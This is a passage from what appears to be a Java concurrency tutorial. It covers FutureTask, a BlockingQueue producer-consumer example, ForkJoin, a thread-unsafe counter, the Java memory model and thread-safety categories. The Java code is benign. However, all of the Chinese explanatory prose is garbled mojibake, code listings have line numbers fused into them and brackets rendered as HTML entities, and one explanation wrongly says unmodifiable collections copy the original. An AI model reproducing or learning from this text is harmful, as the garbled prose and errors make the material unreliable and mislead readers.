ExecutionException, InterruptedException &#123; FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;Integer&gt;(new Callable&lt;Integer&gt;() &#123; @Override public Integer call() throws Exception &#123; int result = 0; for (int i = 0; i &lt; 100; i++) &#123; Thread.sleep(10); result += i; &#125; return result; &#125; &#125;); Thread computeThread = new Thread(futureTask); computeThread.start(); Thread otherThread = new Thread(() -&gt; &#123; System.out.println("other task is running..."); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); otherThread.start(); System.out.println(futureTask.get()); &#125;&#125; 12other task is running...4950 BlockingQueuejava.util.concurrent.BlockingQueue æ¥å£æœ‰ä»¥ä¸‹é˜»å¡é˜Ÿåˆ—çš„å®ç°ï¼š FIFO é˜Ÿåˆ— ï¼šLinkedBlockingQueueã€ArrayBlockingQueueï¼ˆå›ºå®šé•¿åº¦ï¼‰ ä¼˜å…ˆçº§é˜Ÿåˆ— ï¼šPriorityBlockingQueue æä¾›äº†é˜»å¡çš„ take() å’Œ put() æ–¹æ³•ï¼šå¦‚æœé˜Ÿåˆ—ä¸ºç©º take() å°†é˜»å¡ï¼Œç›´åˆ°é˜Ÿåˆ—ä¸­æœ‰å†…å®¹ï¼›å¦‚æœé˜Ÿåˆ—ä¸ºæ»¡ put() å°†é˜»å¡ï¼Œç›´åˆ°é˜Ÿåˆ—æœ‰ç©ºé—²ä½ç½®ã€‚ ä½¿ç”¨ BlockingQueue å®ç°ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ 1234567891011121314151617181920212223242526272829public class ProducerConsumer &#123; private static BlockingQueue&lt;String&gt; queue = new ArrayBlockingQueue&lt;&gt;(5); private static class Producer extends Thread &#123; @Override public void run() &#123; try &#123; queue.put("product"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print("produce.."); &#125; &#125; private static class Consumer extends Thread &#123; @Override public void run() &#123; try &#123; String product = queue.take(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print("consume.."); &#125; &#125;&#125; 1234567891011121314public static void main(String[] args) &#123; for (int i = 0; i &lt; 2; i++) &#123; Producer producer = new Producer(); producer.start(); &#125; for (int i = 0; i &lt; 5; i++) &#123; Consumer consumer = new Consumer(); consumer.start(); &#125; for (int i = 0; i &lt; 3; i++) &#123; Producer producer = new Producer(); producer.start(); &#125;&#125; 1produce..produce..consume..consume..produce..consume..produce..consume..produce..consume.. ForkJoinä¸»è¦ç”¨äºå¹¶è¡Œè®¡ç®—ä¸­ï¼Œå’Œ MapReduce åŸç†ç±»ä¼¼ï¼Œéƒ½æ˜¯æŠŠå¤§çš„è®¡ç®—ä»»åŠ¡æ‹†åˆ†æˆå¤šä¸ªå°ä»»åŠ¡å¹¶è¡Œè®¡ç®—ã€‚ 123456789101112131415161718192021222324252627282930public class ForkJoinExample extends RecursiveTask&lt;Integer&gt; &#123; private final int threhold = 5; private int first; private int last; public ForkJoinExample(int first, int last) &#123; this.first = first; this.last = last; &#125; @Override protected Integer compute() &#123; int result = 0; if (last - first &lt;= threhold) &#123; // ä»»åŠ¡è¶³å¤Ÿå°åˆ™ç›´æ¥è®¡ç®— for (int i = first; i &lt;= last; i++) &#123; result += i; &#125; &#125; else &#123; // æ‹†åˆ†æˆå°ä»»åŠ¡ int middle = first + (last - first) / 2; ForkJoinExample leftTask = new ForkJoinExample(first, middle); ForkJoinExample rightTask = new ForkJoinExample(middle + 1, last); leftTask.fork(); rightTask.fork(); result = leftTask.join() + rightTask.join(); &#125; return result; &#125;&#125; 123456public static void main(String[] args) throws ExecutionException, InterruptedException &#123; ForkJoinExample example = new ForkJoinExample(1, 10000); ForkJoinPool forkJoinPool = new ForkJoinPool(); Future result = forkJoinPool.submit(example); System.out.println(result.get());&#125; ForkJoin ä½¿ç”¨ ForkJoinPool æ¥å¯åŠ¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„çº¿ç¨‹æ± ï¼Œçº¿ç¨‹æ•°é‡å–å†³äº CPU æ ¸æ•°ã€‚ 1public class ForkJoinPool extends AbstractExecutorService ForkJoinPool å®ç°äº†å·¥ä½œçªƒå–ç®—æ³•æ¥æé«˜ CPU çš„åˆ©ç”¨ç‡ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ç»´æŠ¤äº†ä¸€ä¸ªåŒç«¯é˜Ÿåˆ—ï¼Œç”¨æ¥å­˜å‚¨éœ€è¦æ‰§è¡Œçš„ä»»åŠ¡ã€‚å·¥ä½œçªƒå–ç®—æ³•å…è®¸ç©ºé—²çš„çº¿ç¨‹ä»å…¶å®ƒçº¿ç¨‹çš„åŒç«¯é˜Ÿåˆ—ä¸­çªƒå–ä¸€ä¸ªä»»åŠ¡æ¥æ‰§è¡Œã€‚çªƒå–çš„ä»»åŠ¡å¿…é¡»æ˜¯æœ€æ™šçš„ä»»åŠ¡ï¼Œé¿å…å’Œé˜Ÿåˆ—æ‰€å±çº¿ç¨‹å‘ç”Ÿç«äº‰ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼ŒThread2 ä» Thread1 çš„é˜Ÿåˆ—ä¸­æ‹¿å‡ºæœ€æ™šçš„ Task1 ä»»åŠ¡ï¼ŒThread1 ä¼šæ‹¿å‡º Task2 æ¥æ‰§è¡Œï¼Œè¿™æ ·å°±é¿å…å‘ç”Ÿç«äº‰ã€‚ä½†æ˜¯å¦‚æœé˜Ÿåˆ—ä¸­åªæœ‰ä¸€ä¸ªä»»åŠ¡æ—¶è¿˜æ˜¯ä¼šå‘ç”Ÿç«äº‰ã€‚ ä¹ã€çº¿ç¨‹ä¸å®‰å…¨ç¤ºä¾‹å¦‚æœå¤šä¸ªçº¿ç¨‹å¯¹åŒä¸€ä¸ªå…±äº«æ•°æ®è¿›è¡Œè®¿é—®è€Œä¸é‡‡å–åŒæ­¥æ“ä½œçš„è¯ï¼Œé‚£ä¹ˆæ“ä½œçš„ç»“æœæ˜¯ä¸ä¸€è‡´çš„ã€‚ ä»¥ä¸‹ä»£ç æ¼”ç¤ºäº† 1000 ä¸ªçº¿ç¨‹åŒæ—¶å¯¹ cnt æ‰§è¡Œè‡ªå¢æ“ä½œï¼Œæ“ä½œç»“æŸä¹‹åå®ƒçš„å€¼ä¸º 997 è€Œä¸æ˜¯ 1000ã€‚ 123456789101112public class ThreadUnsafeExample &#123; private int cnt = 0; public void add() &#123; cnt++; &#125; public int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; ThreadUnsafeExample example = new ThreadUnsafeExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 1997 åã€Java å†…å­˜æ¨¡å‹Java å†…å­˜æ¨¡å‹è¯•å›¾å±è”½å„ç§ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜è®¿é—®å·®å¼‚ï¼Œä»¥å®ç°è®© Java ç¨‹åºåœ¨å„ç§å¹³å°ä¸‹éƒ½èƒ½è¾¾åˆ°ä¸€è‡´çš„å†…å­˜è®¿é—®æ•ˆæœã€‚ ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜å¤„ç†å™¨ä¸Šçš„å¯„å­˜å™¨çš„è¯»å†™çš„é€Ÿåº¦æ¯”å†…å­˜å¿«å‡ ä¸ªæ•°é‡çº§ï¼Œä¸ºäº†è§£å†³è¿™ç§é€Ÿåº¦çŸ›ç›¾ï¼Œåœ¨å®ƒä»¬ä¹‹é—´åŠ å…¥äº†é«˜é€Ÿç¼“å­˜ã€‚ åŠ å…¥é«˜é€Ÿç¼“å­˜å¸¦æ¥äº†ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼šç¼“å­˜ä¸€è‡´æ€§ã€‚å¦‚æœå¤šä¸ªç¼“å­˜å…±äº«åŒä¸€å—ä¸»å†…å­˜åŒºåŸŸï¼Œé‚£ä¹ˆå¤šä¸ªç¼“å­˜çš„æ•°æ®å¯èƒ½ä¼šä¸ä¸€è‡´ï¼Œéœ€è¦ä¸€äº›åè®®æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æ‰€æœ‰çš„å˜é‡éƒ½å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹è¿˜æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜ï¼Œå·¥ä½œå†…å­˜å­˜å‚¨åœ¨é«˜é€Ÿç¼“å­˜æˆ–è€…å¯„å­˜å™¨ä¸­ï¼Œä¿å­˜äº†è¯¥çº¿ç¨‹ä½¿ç”¨çš„å˜é‡çš„ä¸»å†…å­˜å‰¯æœ¬æ‹·è´ã€‚ çº¿ç¨‹åªèƒ½ç›´æ¥æ“ä½œå·¥ä½œå†…å­˜ä¸­çš„å˜é‡ï¼Œä¸åŒçº¿ç¨‹ä¹‹é—´çš„å˜é‡å€¼ä¼ é€’éœ€è¦é€šè¿‡ä¸»å†…å­˜æ¥å®Œæˆã€‚ å†…å­˜é—´äº¤äº’æ“ä½œJava å†…å­˜æ¨¡å‹å®šä¹‰äº† 8 ä¸ªæ“ä½œæ¥å®Œæˆä¸»å†…å­˜å’Œå·¥ä½œå†…å­˜çš„äº¤äº’æ“ä½œã€‚ readï¼šæŠŠä¸€ä¸ªå˜é‡çš„å€¼ä»ä¸»å†…å­˜ä¼ è¾“åˆ°å·¥ä½œå†…å­˜ä¸­ loadï¼šåœ¨ read ä¹‹åæ‰§è¡Œï¼ŒæŠŠ read å¾—åˆ°çš„å€¼æ”¾å…¥å·¥ä½œå†…å­˜çš„å˜é‡å‰¯æœ¬ä¸­ useï¼šæŠŠå·¥ä½œå†…å­˜ä¸­ä¸€ä¸ªå˜é‡çš„å€¼ä¼ é€’ç»™æ‰§è¡Œå¼•æ“ assignï¼šæŠŠä¸€ä¸ªä»æ‰§è¡Œå¼•æ“æ¥æ”¶åˆ°çš„å€¼èµ‹ç»™å·¥ä½œå†…å­˜çš„å˜é‡ storeï¼šæŠŠå·¥ä½œå†…å­˜çš„ä¸€ä¸ªå˜é‡çš„å€¼ä¼ é€åˆ°ä¸»å†…å­˜ä¸­ writeï¼šåœ¨ store ä¹‹åæ‰§è¡Œï¼ŒæŠŠ store å¾—åˆ°çš„å€¼æ”¾å…¥ä¸»å†…å­˜çš„å˜é‡ä¸­ lockï¼šä½œç”¨äºä¸»å†…å­˜çš„å˜é‡ unlock å†…å­˜æ¨¡å‹ä¸‰å¤§ç‰¹æ€§1. åŸå­æ€§Java å†…å­˜æ¨¡å‹ä¿è¯äº† readã€loadã€useã€assignã€storeã€writeã€lock å’Œ unlock æ“ä½œå…·æœ‰åŸå­æ€§ï¼Œä¾‹å¦‚å¯¹ä¸€ä¸ª int ç±»å‹çš„å˜é‡æ‰§è¡Œ assign èµ‹å€¼æ“ä½œï¼Œè¿™ä¸ªæ“ä½œå°±æ˜¯åŸå­æ€§çš„ã€‚ä½†æ˜¯ Java å†…å­˜æ¨¡å‹å…è®¸è™šæ‹Ÿæœºå°†æ²¡æœ‰è¢« volatile ä¿®é¥°çš„ 64 ä½æ•°æ®ï¼ˆlongï¼Œdoubleï¼‰çš„è¯»å†™æ“ä½œåˆ’åˆ†ä¸ºä¸¤æ¬¡ 32 ä½çš„æ“ä½œæ¥è¿›è¡Œï¼Œå³ loadã€storeã€read å’Œ write æ“ä½œå¯ä»¥ä¸å…·å¤‡åŸå­æ€§ã€‚ æœ‰ä¸€ä¸ªé”™è¯¯è®¤è¯†å°±æ˜¯ï¼Œint ç­‰åŸå­æ€§çš„å˜é‡åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ä¸ä¼šå‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚å‰é¢çš„çº¿ç¨‹ä¸å®‰å…¨ç¤ºä¾‹ä»£ç ä¸­ï¼Œcnt å˜é‡å±äº int ç±»å‹å˜é‡ï¼Œ1000 ä¸ªçº¿ç¨‹å¯¹å®ƒè¿›è¡Œè‡ªå¢æ“ä½œä¹‹åï¼Œå¾—åˆ°çš„å€¼ä¸º 997 è€Œä¸æ˜¯ 1000ã€‚ ä¸ºäº†æ–¹ä¾¿è®¨è®ºï¼Œå°†å†…å­˜é—´çš„äº¤äº’æ“ä½œç®€åŒ–ä¸º 3 ä¸ªï¼šloadã€assignã€storeã€‚ ä¸‹å›¾æ¼”ç¤ºäº†ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶å¯¹ cnt å˜é‡è¿›è¡Œæ“ä½œï¼Œloadã€assignã€store è¿™ä¸€ç³»åˆ—æ“ä½œæ•´ä½“ä¸Šçœ‹ä¸å…·å¤‡åŸå­æ€§ï¼Œé‚£ä¹ˆåœ¨ T1 ä¿®æ”¹ cnt å¹¶ä¸”è¿˜æ²¡æœ‰å°†ä¿®æ”¹åçš„å€¼å†™å…¥ä¸»å†…å­˜ï¼ŒT2 ä¾ç„¶å¯ä»¥è¯»å…¥è¯¥å˜é‡çš„å€¼ã€‚å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸¤ä¸ªçº¿ç¨‹è™½ç„¶æ‰§è¡Œäº†ä¸¤æ¬¡è‡ªå¢è¿ç®—ï¼Œä½†æ˜¯ä¸»å†…å­˜ä¸­ cnt çš„å€¼æœ€åä¸º 1 è€Œä¸æ˜¯ 2ã€‚å› æ­¤å¯¹ int ç±»å‹è¯»å†™æ“ä½œæ»¡è¶³åŸå­æ€§åªæ˜¯è¯´æ˜ loadã€assignã€store è¿™äº›å•ä¸ªæ“ä½œå…·å¤‡åŸå­æ€§ã€‚ AtomicInteger èƒ½ä¿è¯å¤šä¸ªçº¿ç¨‹ä¿®æ”¹çš„åŸå­æ€§ã€‚ ä½¿ç”¨ AtomicInteger é‡å†™ä¹‹å‰çº¿ç¨‹ä¸å®‰å…¨çš„ä»£ç ä¹‹åå¾—åˆ°ä»¥ä¸‹çº¿ç¨‹å®‰å…¨å®ç°ï¼š 1234567891011public class AtomicExample &#123; private AtomicInteger cnt = new AtomicInteger(); public void add() &#123; cnt.incrementAndGet(); &#125; public int get() &#123; return cnt.get(); &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicExample example = new AtomicExample(); // åªä¿®æ”¹è¿™æ¡è¯­å¥ final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 é™¤äº†ä½¿ç”¨åŸå­ç±»ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ synchronized äº’æ–¥é”æ¥ä¿è¯æ“ä½œçš„å®Œæ•´æ€§ï¼Œå®ƒå¯¹åº”çš„å†…å­˜é—´äº¤äº’æ“ä½œä¸ºï¼šlock å’Œ unlockï¼Œåœ¨è™šæ‹Ÿæœºå®ç°ä¸Šå¯¹åº”çš„å­—èŠ‚ç æŒ‡ä»¤ä¸º monitorenter å’Œ monitorexitã€‚ 1234567891011public class AtomicSynchronizedExample &#123; private int cnt = 0; public synchronized void add() &#123; cnt++; &#125; public synchronized int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicSynchronizedExample example = new AtomicSynchronizedExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 2. å¯è§æ€§å¯è§æ€§æŒ‡å½“ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†å…±äº«å˜é‡çš„å€¼ï¼Œå…¶å®ƒçº¿ç¨‹èƒ½å¤Ÿç«‹å³å¾—çŸ¥è¿™ä¸ªä¿®æ”¹ã€‚Java å†…å­˜æ¨¡å‹æ˜¯é€šè¿‡åœ¨å˜é‡ä¿®æ”¹åå°†æ–°å€¼åŒæ­¥å›ä¸»å†…å­˜ï¼Œåœ¨å˜é‡è¯»å–å‰ä»ä¸»å†…å­˜åˆ·æ–°å˜é‡å€¼æ¥å®ç°å¯è§æ€§çš„ã€‚ volatile å¯ä¿è¯å¯è§æ€§ã€‚synchronized ä¹Ÿèƒ½å¤Ÿä¿è¯å¯è§æ€§ï¼Œå¯¹ä¸€ä¸ªå˜é‡æ‰§è¡Œ unlock æ“ä½œä¹‹å‰ï¼Œå¿…é¡»æŠŠå˜é‡å€¼åŒæ­¥å›ä¸»å†…å­˜ã€‚final å…³é”®å­—ä¹Ÿèƒ½ä¿è¯å¯è§æ€§ï¼šè¢« final å…³é”®å­—ä¿®é¥°çš„å­—æ®µåœ¨æ„é€ å™¨ä¸­ä¸€æ—¦åˆå§‹åŒ–å®Œæˆï¼Œå¹¶ä¸”æ²¡æœ‰å‘ç”Ÿ this é€ƒé€¸ï¼ˆå…¶å®ƒçº¿ç¨‹å¯ä»¥é€šè¿‡ this å¼•ç”¨è®¿é—®åˆ°åˆå§‹åŒ–äº†ä¸€åŠçš„å¯¹è±¡ï¼‰ï¼Œé‚£ä¹ˆå…¶å®ƒçº¿ç¨‹å°±èƒ½çœ‹è§ final å­—æ®µçš„å€¼ã€‚ å¯¹å‰é¢çš„çº¿ç¨‹ä¸å®‰å…¨ç¤ºä¾‹ä¸­çš„ cnt å˜é‡ç”¨ volatile ä¿®é¥°ï¼Œä¸èƒ½è§£å†³çº¿ç¨‹ä¸å®‰å…¨é—®é¢˜ï¼Œå› ä¸º volatile å¹¶ä¸èƒ½ä¿è¯æ“ä½œçš„åŸå­æ€§ã€‚ 3. æœ‰åºæ€§æœ‰åºæ€§æ˜¯æŒ‡ï¼šåœ¨æœ¬çº¿ç¨‹å†…è§‚å¯Ÿï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯æœ‰åºçš„ã€‚åœ¨ä¸€ä¸ªçº¿ç¨‹è§‚å¯Ÿå¦ä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯æ— åºçš„ï¼Œæ— åºæ˜¯å› ä¸ºå‘ç”Ÿäº†æŒ‡ä»¤é‡æ’åºã€‚ åœ¨ Java å†…å­˜æ¨¡å‹ä¸­ï¼Œå…è®¸ç¼–è¯‘å™¨å’Œå¤„ç†å™¨å¯¹æŒ‡ä»¤è¿›è¡Œé‡æ’åºï¼Œé‡æ’åºè¿‡ç¨‹ä¸ä¼šå½±å“åˆ°å•çº¿ç¨‹ç¨‹åºçš„æ‰§è¡Œï¼Œå´ä¼šå½±å“åˆ°å¤šçº¿ç¨‹å¹¶å‘æ‰§è¡Œçš„æ­£ç¡®æ€§ã€‚ volatile å…³é”®å­—é€šè¿‡æ·»åŠ å†…å­˜å±éšœçš„æ–¹å¼æ¥ç¦æ­¢æŒ‡ä»¤é‡æ’ï¼Œå³é‡æ’åºæ—¶ä¸èƒ½æŠŠåé¢çš„æŒ‡ä»¤æ”¾åˆ°å†…å­˜å±éšœä¹‹å‰ã€‚ ä¹Ÿå¯ä»¥é€šè¿‡ synchronized æ¥ä¿è¯æœ‰åºæ€§ï¼Œå®ƒä¿è¯æ¯ä¸ªæ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡ŒåŒæ­¥ä»£ç ï¼Œç›¸å½“äºæ˜¯è®©çº¿ç¨‹é¡ºåºæ‰§è¡ŒåŒæ­¥ä»£ç ã€‚ å…ˆè¡Œå‘ç”ŸåŸåˆ™ä¸Šé¢æåˆ°äº†å¯ä»¥ç”¨ volatile å’Œ synchronized æ¥ä¿è¯æœ‰åºæ€§ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒJVM è¿˜è§„å®šäº†å…ˆè¡Œå‘ç”ŸåŸåˆ™ï¼Œè®©ä¸€ä¸ªæ“ä½œæ— éœ€æ§åˆ¶å°±èƒ½å…ˆäºå¦ä¸€ä¸ªæ“ä½œå®Œæˆã€‚ ä¸»è¦æœ‰ä»¥ä¸‹è¿™äº›åŸåˆ™ï¼š 1. å•ä¸€çº¿ç¨‹åŸåˆ™ Single Thread rule åœ¨ä¸€ä¸ªçº¿ç¨‹å†…ï¼Œåœ¨ç¨‹åºå‰é¢çš„æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢çš„æ“ä½œã€‚ 2. ç®¡ç¨‹é”å®šè§„åˆ™ Monitor Lock Rule ä¸€ä¸ª unlock æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢å¯¹åŒä¸€ä¸ªé”çš„ lock æ“ä½œã€‚ 3. volatile å˜é‡è§„åˆ™ Volatile Variable Rule å¯¹ä¸€ä¸ª volatile å˜é‡çš„å†™æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢å¯¹è¿™ä¸ªå˜é‡çš„è¯»æ“ä½œã€‚ 4. çº¿ç¨‹å¯åŠ¨è§„åˆ™ Thread Start Rule Thread å¯¹è±¡çš„ start() æ–¹æ³•è°ƒç”¨å…ˆè¡Œå‘ç”Ÿäºæ­¤çº¿ç¨‹çš„æ¯ä¸€ä¸ªåŠ¨ä½œã€‚ 5. çº¿ç¨‹åŠ å…¥è§„åˆ™ Thread Join Rule join() æ–¹æ³•è¿”å›å…ˆè¡Œå‘ç”Ÿäº Thread å¯¹è±¡çš„ç»“æŸã€‚ 6. çº¿ç¨‹ä¸­æ–­è§„åˆ™ Thread Interruption Rule å¯¹çº¿ç¨‹ interrupt() æ–¹æ³•çš„è°ƒç”¨å…ˆè¡Œå‘ç”Ÿäºè¢«ä¸­æ–­çº¿ç¨‹çš„ä»£ç æ£€æµ‹åˆ°ä¸­æ–­äº‹ä»¶çš„å‘ç”Ÿï¼Œå¯ä»¥é€šè¿‡ Thread.interrupted() æ–¹æ³•æ£€æµ‹åˆ°æ˜¯å¦æœ‰ä¸­æ–­å‘ç”Ÿã€‚ 7. å¯¹è±¡ç»ˆç»“è§„åˆ™ Finalizer Rule ä¸€ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–å®Œæˆï¼ˆæ„é€ å‡½æ•°æ‰§è¡Œç»“æŸï¼‰å…ˆè¡Œå‘ç”Ÿäºå®ƒçš„ finalize() æ–¹æ³•çš„å¼€å§‹ã€‚ 8. ä¼ é€’æ€§ Transitivity å¦‚æœæ“ä½œ A å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ Bï¼Œæ“ä½œ B å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ Cï¼Œé‚£ä¹ˆæ“ä½œ A å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ Cã€‚ åä¸€ã€çº¿ç¨‹å®‰å…¨çº¿ç¨‹å®‰å…¨å®šä¹‰ä¸€ä¸ªç±»åœ¨å¯ä»¥è¢«å¤šä¸ªçº¿ç¨‹å®‰å…¨è°ƒç”¨æ—¶å°±æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ çº¿ç¨‹å®‰å…¨åˆ†ç±»çº¿ç¨‹å®‰å…¨ä¸æ˜¯ä¸€ä¸ªéçœŸå³å‡çš„å‘½é¢˜ï¼Œå¯ä»¥å°†å…±äº«æ•°æ®æŒ‰ç…§å®‰å…¨ç¨‹åº¦çš„å¼ºå¼±é¡ºåºåˆ†æˆä»¥ä¸‹äº”ç±»ï¼šä¸å¯å˜ã€ç»å¯¹çº¿ç¨‹å®‰å…¨ã€ç›¸å¯¹çº¿ç¨‹å®‰å…¨ã€çº¿ç¨‹å…¼å®¹å’Œçº¿ç¨‹å¯¹ç«‹ã€‚ 1. ä¸å¯å˜ä¸å¯å˜ï¼ˆImmutableï¼‰çš„å¯¹è±¡ä¸€å®šæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œæ— è®ºæ˜¯å¯¹è±¡çš„æ–¹æ³•å®ç°è¿˜æ˜¯æ–¹æ³•çš„è°ƒç”¨è€…ï¼Œéƒ½ä¸éœ€è¦å†é‡‡å–ä»»ä½•çš„çº¿ç¨‹å®‰å…¨ä¿éšœæªæ–½ï¼Œåªè¦ä¸€ä¸ªä¸å¯å˜çš„å¯¹è±¡è¢«æ­£ç¡®åœ°æ„å»ºå‡ºæ¥ï¼Œé‚£å…¶å¤–éƒ¨çš„å¯è§çŠ¶æ€æ°¸è¿œä¹Ÿä¸ä¼šæ”¹å˜ï¼Œæ°¸è¿œä¹Ÿä¸ä¼šçœ‹åˆ°å®ƒåœ¨å¤šä¸ªçº¿ç¨‹ä¹‹ä¸­å¤„äºä¸ä¸€è‡´çš„çŠ¶æ€ã€‚ ä¸å¯å˜çš„ç±»å‹ï¼š final å…³é”®å­—ä¿®é¥°çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼› String æšä¸¾ç±»å‹ Number éƒ¨åˆ†å­ç±»ï¼Œå¦‚ Long å’Œ Double ç­‰æ•°å€¼åŒ…è£…ç±»å‹ï¼ŒBigInteger å’Œ BigDecimal ç­‰å¤§æ•°æ®ç±»å‹ã€‚ä½†åŒä¸º Number çš„å­ç±»å‹çš„åŸå­ç±» AtomicInteger å’Œ AtomicLong åˆ™å¹¶éä¸å¯å˜çš„ã€‚ å¯¹äºé›†åˆç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨ Collections.unmodifiableXXX() æ–¹æ³•æ¥è·å–ä¸€ä¸ªä¸å¯å˜çš„é›†åˆã€‚ 1234567public class ImmutableExample &#123; public static void main(String[] args) &#123; Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); Map&lt;String, Integer&gt; unmodifiableMap = Collections.unmodifiableMap(map); unmodifiableMap.put("a", 1); &#125;&#125; 123Exception in thread "main" java.lang.UnsupportedOperationException at java.util.Collections$UnmodifiableMap.put(Collections.java:1457) at ImmutableExample.main(ImmutableExample.java:9) Collections.unmodifiableXXX() å…ˆå¯¹åŸå§‹çš„é›†åˆè¿›è¡Œæ‹·è´ï¼Œéœ€è¦å¯¹é›†åˆè¿›è¡Œä¿®æ”¹çš„æ–¹æ³•éƒ½ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚ 123public V put(K key, V value) &#123; throw new UnsupportedOperationException();&#125; å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œåº”å½“å°½é‡ä½¿å¯¹è±¡æˆä¸ºä¸å¯å˜ï¼Œæ¥æ»¡è¶³çº¿ç¨‹å®‰å…¨ã€‚ 2. ç»å¯¹çº¿ç¨‹å®‰å…¨ä¸ç®¡è¿è¡Œæ—¶ç¯å¢ƒå¦‚ä½•ï¼Œè°ƒç”¨è€…éƒ½ä¸éœ€è¦ä»»ä½•é¢å¤–çš„åŒæ­¥æªæ–½ã€‚ 3. ç›¸å¯¹çº¿ç¨‹å®‰å…¨ç›¸å¯¹çš„çº¿ç¨‹å®‰å…¨éœ€è¦ä¿è¯å¯¹è¿™ä¸ªå¯¹è±¡å•ç‹¬çš„æ“ä½œæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œåœ¨è°ƒç”¨çš„æ—¶å€™ä¸éœ€è¦åšé¢å¤–çš„ä¿éšœæªæ–½ï¼Œä½†æ˜¯å¯¹äºä¸€äº›ç‰¹å®šé¡ºåºçš„è¿ç»­è°ƒç”¨ï¼Œå°±å¯èƒ½éœ€è¦åœ¨è°ƒç”¨ç«¯ä½¿ç”¨é¢å¤–çš„åŒæ­¥æ‰‹æ®µæ¥ä¿è¯è°ƒç”¨çš„æ­£ç¡®æ€§ã€‚ åœ¨ Java è¯­è¨€ä¸­ï¼Œå¤§éƒ¨åˆ†çš„çº¿ç¨‹å®‰å…¨ç±»éƒ½å±äºè¿™ç§ç±»å‹ï¼Œä¾‹å¦‚ Vectorã€HashTableã€Collections çš„ synchronizedCollection() æ–¹æ³•åŒ…è£…çš„é›†åˆç­‰ã€‚ å¯¹äºä¸‹é¢çš„ä»£ç ï¼Œå¦‚æœåˆ é™¤å…ƒç´ çš„çº¿ç¨‹åˆ é™¤äº†ä¸€ä¸ªå…ƒç´ ï¼Œè€Œè·å–å…ƒç´ çš„çº¿ç¨‹è¯•å›¾è®¿é—®ä¸€ä¸ªå·²ç»è¢«åˆ é™¤çš„å…ƒç´ ï¼Œé‚£ä¹ˆå°±ä¼šæŠ›å‡º ArrayIndexOutOfBoundsExceptionã€‚ 1234567891011121314151617181920212223public class VectorUnsafeExample &#123; private static Vector&lt;Integer&gt; vector = new Vector&lt;&gt;(); public static void main(String[] args) &#123; while (true) &#123; for (int i = 0; i &lt; 100; i++) &#123; vector.add(i); &#125; ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.remove(i); &#125; &#125;); executorService.execute(() -&gt; &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.get(i); &#125; &#125;); executorService.shutdown(); &#125; &#125;&#125; 12345Exception in thread "Thread-159738" java.lang.ArrayIndexOutOfBoundsException: Array index out of range: 3 at java.util.Vector.remove(Vector.java:831) at VectorUnsafeExample.lambda$main$0(VectorUnsafeExample.java:14) at VectorUnsafeExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) å¦‚æœè¦ä¿è¯ä¸Šé¢çš„ä»£ç 